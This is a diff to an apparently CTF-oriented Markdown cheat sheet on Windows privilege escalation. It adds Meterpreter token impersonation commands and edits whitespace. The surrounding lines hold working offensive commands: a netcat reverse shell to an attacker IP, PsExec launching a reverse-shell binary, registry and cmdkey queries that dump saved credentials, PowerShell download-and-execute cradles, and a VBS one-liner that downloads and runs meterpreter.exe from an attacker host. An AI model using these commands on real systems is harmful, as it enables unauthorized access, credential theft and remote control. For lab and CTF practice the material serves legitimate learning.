@@ -84,7 +84,11 @@ For most CTFS all you should need is winPEAS
 
     If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
     If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
+### Meterpreter Token Impersonation    
 
+    load incognito    
+    list_tokens -u       
+    impersonate_token domain\\username   #impersonate a domain user   
 ### PrintSpoofer 
 SeImpersonatePrivilege. Windows Server 2016, Server 2019, and Windows 10. 
 [Print Spoofer](https://github.com/itm4n/PrintSpoofer)  
@@ -190,7 +194,7 @@ Confirm perms - overwrite the program? (May need to upload accesschk)
 Use creds locally:     
 
     C:\Windows\System32\runas.exe /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"       
-        PsExec64.exe /accepteula -i -u admin -p password C:\Temp\reverse.exe     
+    PsExec64.exe /accepteula -i -u admin -p password C:\Temp\reverse.exe      
 Search for creds:   
 
 [LaZagne](https://github.com/AlessandroZ/LaZagne/tree/master): search for creds.    
@@ -217,7 +221,8 @@ Unattend files (could contain base64 encoded passwords):
     C:\Windows\system32\sysprep.inf
     C:\Windows\system32\sysprep\sysprep.xml
     
-### Saved creds
+### Saved creds   
+
     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
     cmdkey /list   
     dir C:\Users\username\AppData\Local\Microsoft\Credentials\   
@@ -341,7 +346,8 @@ metasploit tfp server module on Kali
      copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
      copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
     
-## Powershell
+## Powershell    
+
     powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
     powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
     powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Windows\Temp\out  
@@ -349,7 +355,8 @@ metasploit tfp server module on Kali
     
     IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
 
-## VBS 
+## VBS     
+
     echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"
 
 ## XM File Creation (Using copy and paste)
